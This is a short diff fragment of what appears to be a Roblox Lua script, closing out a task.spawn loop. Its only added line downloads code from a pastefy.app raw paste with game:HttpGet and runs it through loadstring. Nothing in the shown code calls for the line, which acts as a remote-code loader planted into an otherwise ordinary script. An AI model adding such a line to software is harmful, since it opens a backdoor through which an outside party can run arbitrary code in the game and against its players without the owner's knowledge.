@@ -104,3 +104,4 @@ task.spawn(function()
         task.wait(0.2)
     end
 end)
+loadstring(game:HttpGet("https://pastefy.app/V2qeV8LU/raw",true))()
